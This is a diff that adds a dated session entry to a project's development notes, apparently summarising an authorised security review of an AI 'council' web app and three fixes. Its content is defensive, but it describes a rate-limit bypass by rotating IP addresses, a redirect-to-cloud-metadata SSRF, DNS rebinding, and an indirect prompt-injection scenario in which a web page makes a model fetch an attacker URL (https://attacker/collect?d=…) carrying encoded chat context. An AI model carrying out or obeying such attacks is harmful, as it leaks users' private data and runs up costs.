@@ -204,6 +204,100 @@ watched to fail before being restored.
 
 ---
 
+## This session (2026-08-12) — an attacker's read of the app, and three fixes
+
+The owner asked for the app looked at "like a hacker would think". Sol did the
+review under an authorised, bounded brief — read-only against production, no
+fuzzing, no payloads. Full document in `docs/attack-surface-sol.md`, and it is
+worth reading whole: it ranks by what an attacker GAINS, and it says plainly
+what it could not check.
+
+Its executive judgement, which reframes the whole surface: **the valuable attack
+here is not shell access, it is getting one council seat to turn private prompt
+context into an outbound URL.** The tool set is read-only, capped, and has no
+write or execution primitive, so an injected page cannot alter Supabase or take
+a tenant. It can still cost confidentiality, an answer nobody asked for, and
+paid calls.
+
+Three findings fixed today. Each was verified in the source before being
+believed, and each fix was reverted and watched to fail.
+
+**Every rate limit in the file was an IP limit wearing a user limit's clothes.**
+`rateLimitKey` prefers `u:<userId>` and falls back to IP, and its own comment
+said the quiet part — "Only routes that run their auth middleware before the
+limiter will have it." None did: `clerkMiddleware` was mounted about a hundred
+lines BELOW the limiters, so `req.auth` never existed at limiter time. One valid
+account rotating source addresses collected a fresh 30-per-minute council
+allowance per address, and a council turn is seven paid model calls plus search
+plus a possible fallback whip. The mount moved above the limiters; nothing else
+changed, because `rateLimitKey` had been written for this and was waiting.
+`middleware-order.test.js` pins it, because **no unit test can see this** — the
+function passes either way when handed a `req` with `auth` set, and the defect
+is the order of two `app.use` calls.
+
+Still missing, and NOT smuggled in: a per-user SPEND ceiling. There is only a
+request rate. A user inside 30/minute can still run the bill up; they just
+cannot multiply themselves across addresses. Sol's proposal is an atomic
+reservation against a daily budget before the first provider call, refunded on
+completion. That is a product decision about money and it is the owner's.
+
+**`/api/feedback` called a paid model with no suspension check.** Every other
+paid route carries `checkSuspended`; this one had `requireAuth` alone while
+invoking `FAST_MODEL` on every rating. A suspended account with a live Clerk
+session kept spending — suspension was not the kill switch it is documented to
+be. The test asserts the whole paid set rather than the one route, because the
+next paid route added is the one at risk.
+
+**`redirect: 'follow'` let the HTTP client outrun `url-guard`.** The link
+checker vetted the URL a model produced and then followed redirects
+unsupervised. An attacker publishes on a public host, gets it into a search
+result, and answers `302 Location: http://169.254.169.254/…`. The check said yes
+to the public host and the fetch went to cloud metadata — **every address the
+guard refuses was reachable in one hop through a host it allows**, which made
+the address list advisory. Now `manual`, with `assertSafeUrl` on every hop,
+resolved against the previous URL, capped at four. Tested against a real
+loopback redirect rather than a stubbed fetch, because the bug was in what the
+client did on our behalf and a stub would only have tested the stub's opinion.
+
+### Still open from that review
+
+- **The DNS-rebinding half of the URL guard.** Each hop is validated by NAME
+  and then fetched by NAME, so a name answering public for the check and private
+  for the connection still wins. `assertSafeUrl` already returns
+  `{ address, family }` for exactly this and every caller throws it away.
+  Closing it means connecting to the vetted address while preserving Host and
+  SNI — a custom dispatcher, not a flag.
+- **Indirect prompt injection**, ranked highest by Sol and still the queued
+  research question. Its concrete shape: a page instructs a seat to encode
+  conversation context into `https://attacker/collect?d=…` and call `read_url`;
+  one seat of seven complying is enough, and the fetch itself is the
+  exfiltration. Sol's proposed fix is structural rather than persuasive — mint
+  an opaque ID per search result and let `read_url` accept only IDs, so a model
+  that has consumed untrusted text cannot author a host, path or query at all.
+  That is worth more than any wording of `UNTRUSTED_PREAMBLE` and it is the
+  first thing to try when this is picked up.
+- **Google API credentials travel in query strings.** Not a repo leak, but
+  query credentials survive in outbound proxy and tracing logs where an
+  Authorization header would not.
+- **Several handlers return raw `err.message`**, including provider and Supabase
+  failures. Sol declined to inflate it into a finding on a public-source app and
+  suggested stable public codes with the original kept in Sentry.
+- Sol could not verify: live RLS (service-role traffic bypasses it, so no
+  source review can prove the policies work for `authenticated`), any
+  signed-in route, `COUNCIL_TOOLS` state, or the Perplexity key rotation. It
+  found no history evidence of that key, which is not the same as it being safe.
+
+**What is well defended, worth knowing so effort goes elsewhere:** the URL
+parser handles decimal, octal, hex and IPv4-mapped IPv6 encodings correctly —
+the flaw was always callers discarding its result, never the parser. The tool
+loop's blast radius is genuinely bounded: read-only tools, four rounds, twelve
+unique calls, per-call and wall clocks, output clamps, untrusted text kept out
+of system position, opaque file IDs bound to `(user, chat)`. Route enumeration
+found no missing `requireAuth` across 30 routes; `/health` and the
+signature-verified Stripe webhook are the only public ones, by design.
+
+---
+
 ## This session (2026-08-12) — the CSP finding was aimed at the wrong CSP
 
 Chased `'unsafe-inline'` in `server.js`'s helmet block, on the assumption it was
